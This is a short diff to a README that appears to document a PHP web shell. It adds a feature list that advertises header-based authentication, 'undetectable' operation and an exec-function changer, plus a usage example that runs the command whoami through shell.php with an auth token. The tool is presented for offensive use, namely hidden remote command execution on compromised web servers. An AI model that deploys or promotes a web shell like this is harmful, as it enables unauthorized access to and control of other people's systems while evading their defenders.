@@ -12,6 +12,16 @@
     <img src="https://img.shields.io/badge/issues-0-red.svg">
     <img src="https://img.shields.io/badge/php-7-green.svg">
     <img src="https://img.shields.io/badge/php-5-green.svg">
-
 </p>
+
+- Http Header Based Authentication.
+- Undetectable.
+- Exec Function Changer.
+
+### USAGE
+```
+GET /test/shell.php?fn=1&&cmd=whoami
+HOST : http://test.com
+Authtoken : bb3b1a1f-0447-42a6-955a-88681fb88499
+```
 
